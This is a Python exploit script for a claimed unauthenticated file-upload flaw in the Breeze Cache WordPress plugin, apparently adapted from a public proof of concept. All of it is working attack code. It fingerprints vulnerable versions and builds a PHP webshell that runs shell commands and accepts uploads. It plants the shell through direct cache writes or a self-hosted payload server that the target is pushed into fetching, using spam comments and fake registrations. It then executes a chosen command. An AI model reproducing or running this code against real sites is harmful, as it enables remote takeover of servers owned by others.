# -*- coding: utf-8 -*-
# CVE-2026-3844 — Breeze Cache WP Plugin Arbitrary File Upload (Unauth RCE)
# Refactored from AnggaTechI PoC. Core logic preserved (direct + remote).
import http.server
import os
import re
import secrets
import socketserver
import subprocess
import threading
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from urllib.parse import quote

CVE_ID = 'CVE-2026-3844'
CVE_NAME = 'Breeze Cache <= 2.4.4 Unauth File Upload'

PAYLOAD_NAME = f"wp_{secrets.token_hex(4)}.php"


# ────────────── helpers (dipertahankan dari asli) ──────────────
def build_shell() -> bytes:
    """Generate minimal PHP webshell."""
    return b"""<pre>SIG:GY - CVE-2026-3844</pre>
<hr>
<?php
echo '<pre>'.php_uname().'</pre>';
echo '<form method=GET><input name=c><input type=submit value=Exec></form>';
echo '<form method=POST enctype=multipart/form-data><input type=file name=f><input type=submit value=Upload></form>';
if(isset($_GET['c'])){echo '<pre>'.shell_exec($_GET['c']).'</pre>';}
if(isset($_FILES['f'])&&$_FILES['f']['error']===UPLOAD_ERR_OK){move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo 'OK: '.$_FILES['f']['name'];}
?>"""


def req(url: str, timeout: float = 8, data: bytes = None,
        headers: dict = None) -> tuple[int, bytes]:
    try:
        method = "POST" if data else "GET"
        r = urllib.request.urlopen(urllib.request.Request(
            url, data=data, headers=headers or {}, method=method
        ), timeout=timeout)
        return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception:
        return 0, b""


class QuietHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass


def start_payload_server(shell_content: bytes, filename: str, port: int = None):
    """Start a temporary HTTP server serving the PHP shell."""
    if port is None:
        port = secrets.randbelow(10000) + 50000

    os.makedirs("/tmp/breeze_payload", exist_ok=True)
    with open(f"/tmp/breeze_payload/{filename}", "wb") as f:
        f.write(shell_content)

    os.chdir("/tmp/breeze_payload")
    server = socketserver.TCPServer(("", port), QuietHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server, port


def detect_vuln(target: str) -> dict:
    """Detect Breeze plugin, version, and gravatar status."""
    if "://" not in target:
        target = f"http://{target}"
    base = target.rstrip("/")
    info = {"base": base, "vuln": False, "wp_path": None, "breeze_ver": "", "gravatar_on": False, "msg": ""}

    code, body = req(f"{base}/wp-login.php")
    if b"wp-submit" not in body:
        code2, body2 = req(f"{base}/")
        if b"wp-content" not in (body2 or b""):
            info["msg"] = "Not WordPress"
            return info

    code, body = req(f"{base}/wp-content/plugins/breeze/readme.txt")
    if code == 200:
        m = re.search(rb"Stable tag:\s*([0-9.]+)", body)
        if m:
            info["breeze_ver"] = m.group(1).decode()
    if not info["breeze_ver"]:
        code2, body2 = req(f"{base}/wp-content/plugins/breeze/breeze.php")
        if b"Plugin Name:" not in body2:
            info["msg"] = "Breeze plugin not found"
            return info
        info["breeze_ver"] = "?"

    try:
        parts = [int(x) for x in info["breeze_ver"].split(".")]
        ok = (parts[0] < 2 or (parts[0] == 2 and parts[1] < 4) or
              (parts[0] == 2 and parts[1] == 4 and parts[2] <= 4))
        if not ok:
            info["breeze_ver"] += " (patched)"
            info["msg"] = "Version patched"
            return info
    except ValueError:
        pass

    code, body = req(f"{base}/")
    if b"breeze-extra/gravatars" in body:
        info["gravatar_on"] = True

    info["vuln"] = True
    return info


def find_wp_path(target: str) -> str | None:
    """Try to find WordPress root directory on localhost."""
    base = target.rstrip("/")
    if "://" in base:
        base = base.split("://")[1]
    hostname = base.split("/")[0].split(":")[0]

    if hostname not in ("localhost", "127.0.0.1", "::1"):
        return None

    docroot = base.split("/", 1)[1] if "/" in base else ""
    common = [
        f"/var/www/html/{docroot}",
        f"/var/www/{docroot}",
        f"/opt/lampp/htdocs/{docroot}",
        f"/xampp/htdocs/{docroot}",
        f"C:/xampp/htdocs/{docroot}",
    ]
    for p in common:
        wp_conf = Path(p.rstrip("/")) / "wp-config.php"
        if wp_conf.exists():
            return str(wp_conf.parent)

    try:
        result = subprocess.run(["wp", "eval", "echo ABSPATH;"],
                              shell=True, capture_output=True, text=True, timeout=5,
                              cwd=Path.cwd())
        if result.returncode == 0:
            return result.stdout.strip()
    except Exception:
        pass

    return None


def direct_inject(target: str, shell_content: bytes, filename: str) -> tuple[bool, str]:
    """Direct file write to breeze cache dir (localhost only)."""
    wp_path = find_wp_path(target)
    if not wp_path:
        return False, "not localhost / wp path not found"

    wp_content = os.path.join(wp_path, "wp-content")
    cache_dir = os.path.join(wp_content, "cache", "breeze-extra", "gravatars")
    os.makedirs(cache_dir, exist_ok=True)

    paths = [
        (os.path.join(cache_dir, filename),
         f"{target}/wp-content/cache/breeze-extra/gravatars/{filename}"),
        (os.path.join(cache_dir, f"1{filename}"),
         f"{target}/wp-content/cache/breeze-extra/gravatars/1{filename}"),
        (os.path.join(cache_dir, "1", filename),
         f"{target}/wp-content/cache/breeze-extra/gravatars/1/{filename}"),
    ]

    for path, url in paths:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as f:
            f.write(shell_content)
        if not url.startswith("http"):
            url = f"http://{url}"
        code, body = req(url, timeout=5)
        if b"SIG:GY" in body:
            return True, url

    return True, f"http://{paths[0][1]}" if not paths[0][1].startswith("http") else paths[0][1]


def get_local_ip() -> str:
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip


def remote_inject(target: str, shell_content: bytes, filename: str) -> tuple[bool, str]:
    """Remote injection — force Breeze to download & cache our PHP shell."""
    if "://" not in target:
        target = f"http://{target}"
    base = target.rstrip("/")

    server, port = start_payload_server(shell_content, filename)
    payload_url = f"http://{get_local_ip()}:{port}/{filename}"

    code, body = req(f"{base}/", timeout=10)

    post_ids = re.findall(rb'"post-(\d+)"', body or b"")
    if post_ids:
        pid = post_ids[0].decode()
        code2, body2 = req(f"{base}/?p={pid}", timeout=10)
        nonce = re.search(rb'name="_wp_unfiltered_html_comment_disabled"\s+value="([^"]+)"', body2 or b"")
        comment_data = urllib.parse.urlencode({
            "comment": f"SIG:GY test {secrets.token_hex(4)}",
            "author": "SIG-GY",
            "email": f"{secrets.token_hex(4)}@test.com",
            "url": payload_url,
            "comment_post_ID": pid,
            "comment_parent": "0",
        }).encode()
        req(f"{base}/wp-comments-post.php", timeout=10, data=comment_data,
            headers={"Content-Type": "application/x-www-form-urlencoded"})

    code3, body3 = req(f"{base}/wp-login.php?action=register", timeout=10)
    if b"user_login" in body3 and b"user_email" in body3:
        reg_data = urllib.parse.urlencode({
            "user_login": f"siggy_{secrets.token_hex(3)}",
            "user_email": f"{secrets.token_hex(4)}@test.com",
        }).encode()
        req(f"{base}/wp-login.php?action=register", timeout=10,
            data=reg_data,
            headers={"Content-Type": "application/x-www-form-urlencoded"})

    avatar_endpoints = [
        f"{base}/wp-json/wp/v2/users",
        f"{base}/wp-json/wp/v2/comments",
        f"{base}/wp-json/wp/v2/posts?_embed",
    ]
    for ep in avatar_endpoints:
        req(ep, timeout=10)

    visited = set()
    for pid in (post_ids or [])[:5]:
        url = f"{base}/?p={pid.decode()}"
        if url not in visited:
            visited.add(url)
            req(url, timeout=10)

    req(f"{base}/xmlrpc.php", timeout=8)

    patterns = [
        f"{{base}}/wp-content/cache/breeze-extra/gravatars/{filename}",
        f"{{base}}/wp-content/cache/breeze-extra/gravatars/1{filename}",
        f"{{base}}/wp-content/cache/breeze-extra/gravatars/1/{filename}",
        f"{{base}}/wp-content/cache/breeze-extra/gravatars/2/{filename}",
        f"{{base}}/wp-content/cache/breeze-extra/gravatars/1{filename.lower()}",
    ]
    for pat in patterns:
        url = pat.format(base=base)
        if b"SIG:GY" in req(url, timeout=5)[1]:
            server.shutdown()
            return True, url

    server.shutdown()
    return False, "payload not cached — target may need 'Host Gravatars' ON + custom avatar plugin"


# ────────────── public exec helper ──────────────
def run(shell_url, cmd, timeout=10):
    """Execute command via deployed shell."""
    try:
        url = f"{shell_url}?c={quote(cmd)}"
        code, body = req(url, timeout=timeout)
        return body.decode('utf-8', 'replace').strip()
    except Exception as e:
        return f"<cmd error: {e}>"


# ────────────── PUBLIC FUNCTION ──────────────
def exploit(target_url, command="id", debug=False):
    """
    Exploit CVE-2026-3844 (Breeze Cache unauth file upload).

    Args:
        target_url : str  — 'http://x.com', 'x.com', 'localhost'
        command    : str  — Command untuk dijalankan setelah RCE
        debug      : bool — Kumpulkan log langkah-langkah

    Returns:
        dict — Kontrak standar
    """
    res = {
        'target': target_url,
        'cve': CVE_ID,
        'plugin': 'breeze',
        'endpoint': None,
        'http_status': None,
        'vulnerable': False,
        'rce_verified': 'NO',
        'output': '',
        'shell_url': '',
        'marker': 'SIG:GY',
        'detail': '',
        'exploited': False,
        'log': [],
    }
    log = res['log']

    def _step(msg):
        if debug:
            log.append(msg)

    if not target_url or not target_url.strip():
        res['detail'] = 'empty target'
        return res

    if "://" not in target_url:
        target_url = f"http://{target_url}"
    target = target_url.rstrip("/")
    res['target'] = target

    _step(f"Scanning {target}...")
    info = detect_vuln(target)

    if not info["vuln"]:
        res['detail'] = info.get('msg', 'not vulnerable')
        return res

    res['vulnerable'] = True
    _step(f"Breeze v{info['breeze_ver']} VULN")

    shell_content = build_shell()
    shell_file = PAYLOAD_NAME

    _step("Injecting payload...")
    success, result = direct_inject(target, shell_content, shell_file)

    if not success:
        _step("Direct inject failed. Trying remote trigger...")
        success, result = remote_inject(target, shell_content, shell_file)

    if not success:
        res['detail'] = f"Injection failed: {result}"
        return res

    res['shell_url'] = result
    res['endpoint'] = result

    code, body = req(result, timeout=10)
    if b"SIG:GY" in body:
        res['exploited'] = True
        res['rce_verified'] = 'YES'
        res['http_status'] = code
        res['detail'] = 'Shell deployed & verified'
        
        if command:
            cmd_out = run(result, command)
            res['output'] = cmd_out[:300]
    else:
        res['detail'] = 'Shell URL returned but signature not found'

    return res